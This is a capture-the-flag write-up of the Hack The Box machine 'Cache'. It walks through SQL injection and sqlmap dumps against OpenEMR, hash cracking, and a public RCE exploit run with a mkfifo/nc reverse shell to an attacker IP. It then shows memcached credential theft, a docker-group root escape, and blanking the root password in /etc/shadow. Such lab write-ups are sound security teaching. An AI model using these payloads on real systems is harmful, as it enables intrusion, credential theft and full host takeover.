---
layout: single
title: Cache - Hack The Box
excerpt: "On Cache, we start off with bypassing a simple login form that uses client-side user/password validation, then find a vhost with a vulnerable OpenEMR application. After bypassing the login page, obtaining a valid session cookie and dumping the database through a SQLi injection vulnerability we exploit yet another OpenEMR CVE to get a shell. From there we have access to a memcache instance holding more credentials in memory so we can escalate to another user. Using the docker group membership of that last user, we're able to launch a privileged container and get root privileges on the host itself."
date: 2020-10-10
classes: wide
header:
  teaser: /assets/images/htb-writeup-cache/cache_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - javascript
  - client-side validation
  - sqli
  - vhost
  - openemr
  - cve
  - john
  - memcached
  - docker
---

![](/assets/images/htb-writeup-cache/cache_logo.png)

On Cache, we start off with bypassing a simple login form that uses client-side user/password validation, then find a vhost with a vulnerable OpenEMR application. After bypassing the login page, obtaining a valid session cookie and dumping the database through a SQLi injection vulnerability we exploit yet another OpenEMR CVE to get a shell. From there we have access to a memcache instance holding more credentials in memory so we can escalate to another user. Using the docker group membership of that last user, we're able to launch a privileged container and get root privileges on the host itself.

## Recon

```
snowscan@kali:~$ sudo nmap -sC -sV 10.10.10.188
[sudo] password for snowscan: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-09 18:28 EDT
Nmap scan report for cache.htb (10.10.10.188)
Host is up (0.017s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA)
|   256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA)
|_  256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Cache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.63 seconds
```

## Website recon

Main website page:

![](/assets/images/htb-writeup-cache/website1.png)

Login page:

![](/assets/images/htb-writeup-cache/website2.png)

The login page source code uses the following javascript file:

```html
<script src="jquery/functionality.js"></script>
```

The client-side javascript code is responsible for authentication and we can see the user/pass in the code: `ash / H@v3_fun`

```javascript
function checkCorrectPassword(){
        var Password = $("#password").val();
        if(Password != 'H@v3_fun'){
            alert("Password didn't Match");
            error_correctPassword = true;
        }
    }
    function checkCorrectUsername(){
        var Username = $("#username").val();
        if(Username != "ash"){
            alert("Username didn't Match");
            error_username = true;
        }
    }
```

Once logged in we have the following page:

![](/assets/images/htb-writeup-cache/website3.png)

This seems like a dead end so let's move on. Next, on the author page we have a reference to HMS (Hospital Management System). This could be a vhost on the server because we haven't seen a link to this on the main page.

![](/assets/images/htb-writeup-cache/website4.png)

## Fuzzing vhosts

I missed this part at first because they didn't use $VHOST.cache.htb but instead had used $VHOST.htb.

```
snowscan@kali:~$ ffuf -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -fw 902 -H "Host: FUZZ.htb" -u http://cache.htb

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://cache.htb
 :: Wordlist         : FUZZ: /home/snowscan/tools/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response words: 902
________________________________________________

hms                     [Status: 302, Size: 0, Words: 1, Lines: 1]
```

## HMS website

We found the HMS website **hms.htb** but we don't have the credentials to log in.

![](/assets/images/htb-writeup-cache/hms1.png)

Let's dirbust the site to see if we can find anything interesting.

```
snowscan@kali:~$ gobuster dir -w tools/SecLists/Discovery/Web-Content/big.txt -u http://hms.htb
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://hms.htb
[+] Threads:        10
[+] Wordlist:       tools/SecLists/Discovery/Web-Content/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/09 19:17:40 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/LICENSE (Status: 200)
/ci (Status: 301)
/cloud (Status: 301)
/common (Status: 301)
/config (Status: 301)
/contrib (Status: 301)
/controllers (Status: 301)
/custom (Status: 301)
/entities (Status: 301)
/images (Status: 301)
/interface (Status: 301)
/javascript (Status: 301)
/library (Status: 301)
/modules (Status: 301)
/myportal (Status: 301)
/patients (Status: 301)
/portal (Status: 301)
/public (Status: 301)
/repositories (Status: 301)
/server-status (Status: 403)
/services (Status: 301)
/sites (Status: 301)
/sql (Status: 301)
/templates (Status: 301)
/tests (Status: 301)
/vendor (Status: 301)
===============================================================
2020/05/09 19:18:13 Finished
===============================================================
```

The `/sql` directory contains a bunch of upgrade files, so based on the names we can guess we're currently running verison 5.0.1

![](/assets/images/htb-writeup-cache/hms2.png)

## Retrieving the username and password from the SQL database

After doing some research we find a vulnerability report that contains many SQL injection vulnerabilities:

[https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf](https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf)

There's an information disclosure vulnerability where we can find the database name and version of the application.

- Version: 5.0.1(3)
- DB name: openemr

![](/assets/images/htb-writeup-cache/version.png)

First, we'll bypass the authentication page by visiting the registration page then browsing to another page like `add_edit_event_user.php`.

![](/assets/images/htb-writeup-cache/bypass1.png)

I'll grab the cookie values so I can use them with sqlmap.

![](/assets/images/htb-writeup-cache/bypass2.png)

We can do the SQL injection manually like the following and extract information like the database server version.

```
GET /portal/find_appt_popup_user.php?catid=1'+AND+(SELECT+0+FROM(SELECT+COUNT(*),CONCAT(%40%40VERSION,FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.PLUGINS+GROUP+BY+x)a)--+-
[...]
Duplicate entry '5.7.30-0ubuntu0.18.04.11' for key '&lt;group_key&gt;'
```

But instead we'll use sqlmap to speed up the exploitation of this box. We can see here that sqlmap has identified the injection point for the vulnerability and it is error-based so it should be quick to dump the contents of the database.

```
snowscan@kali:~/htb/cache$ sqlmap -u "http://hms.htb/portal/find_appt_popup_user.php?catid=*" --cookie="OpenEMR=vp4f9asgbv507vpt84cioecmbg; PHPSESSID=cs1o3vot21n4odtira0s19iqu1" --technique E --dbms=mysql        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.4#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:32:35 /2020-05-10/

custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] 
[09:32:37] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly
[09:32:37] [INFO] testing connection to the target URL
[09:32:37] [INFO] heuristic (basic) test shows that URI parameter '#1*' might be injectable (possible DBMS: 'MySQL')
[09:32:37] [INFO] testing for SQL injection on URI parameter '#1*'
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] 
[09:32:40] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[09:32:40] [WARNING] reflective value(s) found and filtering out
[09:32:43] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[09:32:46] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[09:32:49] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[09:32:52] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[09:32:55] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[09:32:58] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[09:33:01] [INFO] URI parameter '#1*' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 346 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: http://hms.htb:80/portal/find_appt_popup_user.php?catid='||(SELECT 0x426c764c WHERE 3030=3030 AND (SELECT 8964 FROM(SELECT COUNT(*),CONCAT(0x7176786a71,(SELECT (ELT(8964=8964,1))),0x71716b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'
---
[09:33:16] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0
[09:33:17] [INFO] fetched data logged to text files under '/home/snowscan/.sqlmap/output/hms.htb'

[*] ending @ 09:33:17 /2020-05-10/
```

We'll dump the `users_secure` table containg the password hash.

```
snowscan@kali:~/htb/cache$ sqlmap -u "http://hms.htb/portal/find_appt_popup_user.php?catid=*" --cookie="OpenEMR=vp4f9asgbv507vpt84cioecmbg; PHPSESSID=cs1o3vot21n4odtira0s19iqu1" --technique E --dbms=mysql -D openemr -T users_secure --dump
        ___
       __H__                                                                                                       
 ___ ___[)]_____ ___ ___  {1.4.4#stable}                                                                           
|_ -| . [']     | .'| . |                                                                                          
|___|_  [,]_|_|_|__,|  _|                                                                                          
      |_|V...       |_|   http://sqlmap.org                                                                        

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 09:34:49 /2020-05-10/

custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] 
[09:34:49] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly
[09:34:49] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* (URI)
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: http://hms.htb:80/portal/find_appt_popup_user.php?catid='||(SELECT 0x426c764c WHERE 3030=3030 AND (SELECT 8964 FROM(SELECT COUNT(*),CONCAT(0x7176786a71,(SELECT (ELT(8964=8964,1))),0x71716b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'                                                                       
---
[09:34:49] [INFO] testing MySQL
[09:34:49] [INFO] confirming MySQL
[09:34:50] [WARNING] reflective value(s) found and filtering out
[09:34:50] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0
[09:34:50] [INFO] fetching columns for table 'users_secure' in database 'openemr'
[09:34:50] [INFO] retrieved: 'id'
[09:34:50] [INFO] retrieved: 'bigint(20)'
[09:34:50] [INFO] retrieved: 'username'
[09:34:50] [INFO] retrieved: 'varchar(255)'
[09:34:50] [INFO] retrieved: 'password'
[09:34:50] [INFO] retrieved: 'varchar(255)'
[09:34:50] [INFO] retrieved: 'salt'
[09:34:50] [INFO] retrieved: 'varchar(255)'
[09:34:50] [INFO] retrieved: 'last_update'
[09:34:50] [INFO] retrieved: 'timestamp'
[09:34:50] [INFO] retrieved: 'password_history1'
[09:34:50] [INFO] retrieved: 'varchar(255)'
[09:34:50] [INFO] retrieved: 'salt_history1'
[09:34:50] [INFO] retrieved: 'varchar(255)'
[09:34:50] [INFO] retrieved: 'password_history2'
[09:34:50] [INFO] retrieved: 'varchar(255)'
[09:34:50] [INFO] retrieved: 'salt_history2'
[09:34:50] [INFO] retrieved: 'varchar(255)'
[09:34:50] [INFO] fetching entries for table 'users_secure' in database 'openemr'
[09:34:50] [INFO] retrieved: '1'
[09:34:51] [INFO] retrieved: '$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.'
[09:34:51] [INFO] retrieved: '2019-11-21 06:38:40'
[09:34:51] [INFO] retrieved: ' '
[09:34:51] [INFO] retrieved: ' '
[09:34:51] [INFO] retrieved: '$2a$05$l2sTLIG6GTBeyBf7TAKL6A$'
[09:34:51] [INFO] retrieved: ' '
[09:34:51] [INFO] retrieved: ' '
[09:34:51] [INFO] retrieved: 'openemr_admin'
Database: openemr
Table: users_secure
[1 entry]
+------+--------------------------------+---------------+--------------------------------------------------------------+---------------------+---------------+---------------+-------------------+-------------------+
| id   | salt                           | username      | password                                                     | last_update         | salt_history1 | salt_history2 | password_history1 | password_history2 |
+------+--------------------------------+---------------+--------------------------------------------------------------+---------------------+---------------+---------------+-------------------+-------------------+
| 1    | $2a$05$l2sTLIG6GTBeyBf7TAKL6A$ | openemr_admin | $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B. | 2019-11-21 06:38:40 | NULL          | NULL          | NULL              | NULL              |
+------+--------------------------------+---------------+--------------------------------------------------------------+---------------------+---------------+---------------+-------------------+-------------------+

[09:34:51] [INFO] table 'openemr.users_secure' dumped to CSV file '/home/snowscan/.sqlmap/output/hms.htb/dump/openemr/users_secure.csv'                                                                                               
[09:34:51] [INFO] fetched data logged to text files under '/home/snowscan/.sqlmap/output/hms.htb'

[*] ending @ 09:34:51 /2020-05-10/
```

Then with John we can crack that hash and get the password: `xxxxxx`

```
snowscan@kali:~/htb/cache$ john -w=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 32 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
xxxxxx           (?)
1g 0:00:00:00 DONE (2020-05-10 09:41) 7.692g/s 6646p/s 6646c/s 6646C/s tristan..felipe
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

## OpenEMR remote code execution

Checking searchsploit, I see a RCE exploit for our version.

```
OpenEMR < 5.0.1 - (Authenticated) Remote Code Execution
[...]
searchsploit -x 45161

# Title: OpenEMR < 5.0.1 - Remote Code Execution
# Author: Cody Zacharias
# Date: 2018-08-07
# Vendor Homepage: https://www.open-emr.org/
# Software Link: https://github.com/openemr/openemr/archive/v5_0_1_3.tar.gz
# Dockerfile: https://github.com/haccer/exploits/blob/master/OpenEMR-RCE/Dockerfile 
# Version: < 5.0.1 (Patch 4)
# Tested on: Ubuntu LAMP, OpenEMR Version 5.0.1.3
# References:
# https://www.youtube.com/watch?v=DJSQ8Pk_7hc
[...]
```

Launching exploit and getting that first shell:

```
snowscan@kali:~/htb/cache$ python exploit.py http://hms.htb/ -u openemr_admin -p xxxxxx -c 'rm /tmp/s;mkfifo /tmp/s;cat /tmp/s|/bin/sh -i 2>&1|nc 10.10.14.10 4444 >/tmp/s'
 .---.  ,---.  ,---.  .-. .-.,---.          ,---.    
/ .-. ) | .-.\ | .-'  |  \| || .-'  |\    /|| .-.\   
| | |(_)| |-' )| `-.  |   | || `-.  |(\  / || `-'/   
| | | | | |--' | .-'  | |\  || .-'  (_)\/  ||   (    
\ `-' / | |    |  `--.| | |)||  `--.| \  / || |\ \   
 )---'  /(     /( __.'/(  (_)/( __.'| |\/| ||_| \)\  
(_)    (__)   (__)   (__)   (__)    '-'  '-'    (__) 
                                                       
   ={   P R O J E C T    I N S E C U R I T Y   }=    
                                                       
         Twitter : @Insecurity                       
         Site    : insecurity.sh                     

[$] Authenticating with openemr_admin:xxxxxx
[$] Injecting payload
```

```
snowscan@kali:~/htb/cache$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.188] 34032
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@cache:/var/www/hms.htb/public_html/interface/main$
```

From there we can su to user `ash` and use the same password we found earlier on the javascript code for the useless login page.

```
www-data@cache:/var/www/hms.htb/public_html/interface/main$ su -l ash
su -l ash
Password: H@v3_fun

ash@cache:~$ cd
cd
ash@cache:~$ cat user.txt
cat user.txt
d415c4620a9ea235eac89874e513dcb0
ash@cache:~$
```

## Pivot to user luffy

The `/etc/passwd` file contains another user `luffy` but I see there's also a `memcache` user.

```
ash@cache:~$ tail -n 10 /etc/passwd
tail -n 10 /etc/passwd
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
ash:x:1000:1000:ash:/home/ash:/bin/bash
luffy:x:1001:1001:,,,:/home/luffy:/bin/bash
memcache:x:111:114:Memcached,,,:/nonexistent:/bin/false
mysql:x:112:115:MySQL Server,,,:/nonexistent:/bin/false
```

Yup, memcache is running on there.

```
ash@cache:~$ netstat -panut | grep 11211
netstat -panut | grep 11211
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 127.0.0.1:11211         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:11211         127.0.0.1:38902         ESTABLISHED -                   
tcp        0      0 127.0.0.1:11211         127.0.0.1:38888         TIME_WAIT   -                   
tcp        0      0 127.0.0.1:38902         127.0.0.1:11211         ESTABLISHED -
```

Memcache doesn't require authentication so we can pull information from the cache just by connecting and sending commands on port 11211. Here we'll get information about the slabs.

```
ash@cache:~$ telnet 127.0.0.1 11211
telnet 127.0.0.1 11211
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
stats slabs
stats slabs
STAT 1:chunk_size 96
STAT 1:chunks_per_page 10922
STAT 1:total_pages 1
STAT 1:total_chunks 10922
STAT 1:used_chunks 5
STAT 1:free_chunks 10917
STAT 1:free_chunks_end 0
STAT 1:mem_requested 371
STAT 1:get_hits 0
STAT 1:cmd_set 1070
STAT 1:delete_hits 0
STAT 1:incr_hits 0
STAT 1:decr_hits 0
STAT 1:cas_hits 0
STAT 1:cas_badval 0
STAT 1:touch_hits 0
STAT active_slabs 1
STAT total_malloced 1048576
END
```

What's really useful for us is the information about the keys. With the `stats cachedump` command we can see the keys currently stored.

```
stats cachedump 1 0
ITEM link [21 b; 0 s]
ITEM user [5 b; 0 s]
ITEM passwd [9 b; 0 s]
ITEM file [7 b; 0 s]
ITEM account [9 b; 0 s]
END
```

Then with the `get` command and the key name, we find some credentials in the cached values: `luffy / 0n3_p1ec3`

```
get link
VALUE link 0 21
https://hackthebox.eu
END

get user
VALUE user 0 5
luffy
END

get passwd
VALUE passwd 0 9
0n3_p1ec3
END

get file
VALUE file 0 7
nothing
END

get account
VALUE account 0 9
afhj556uo
END
```

I can see as `luffy` now:

```
snowscan@kali:~/htb/cache$ ssh luffy@10.10.10.188
luffy@10.10.10.188's password: 
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-99-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun May 10 13:53:17 UTC 2020

  System load:  0.13              Processes:              196
  Usage of /:   74.5% of 8.06GB   Users logged in:        1
  Memory usage: 21%               IP address for ens160:  10.10.10.188
  Swap usage:   0%                IP address for docker0: 172.17.0.1


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

107 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun May 10 13:49:37 2020 from 10.10.14.52
luffy@cache:~$
```

## Privesc

Luffy is a member of the `docker` group so he can start new containers.

```
luffy@cache:~$ id
uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker)
```

There's already a ubuntu image on the box so I don't even to upload my own.

```
luffy@cache:~$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
ubuntu              latest              2ca708c1c9cc        7 months ago        64.2MB
```

I can launch the container and mount the root filesystem inside of `/mnt/pwn` and read the root.txt flag.

```
luffy@cache:~$ docker run -v /:/mnt/pwn -ti ubuntu
root@6c8efcc60a41:/# cd /mnt/pwn/root
root@6c8efcc60a41:/mnt/pwn/root# ls
root.txt
root@6c8efcc60a41:/mnt/pwn/root# cat root.txt
61673a57f540ad2350f46e78e6c4b8a1
```

To log in as root I can just null out the root password with the following:

```
root@697e85ba9d8a:/mnt/pwn/etc# sed -i s/root:.*:18178:0:99999:7:::/root::18178:0:99999:7:::/ shadow
root@f8e7727da260:/mnt/pwn/etc/pam.d# sed -i s/nullok_secure/nullok/ common-auth
luffy@cache:~$ su
root@cache:/home/luffy# id
uid=0(root) gid=0(root) groups=0(root)
root@cache:/home/luffy# cat /root/root.txt
61673a57f540ad2350f46e78e6c4b8a1
```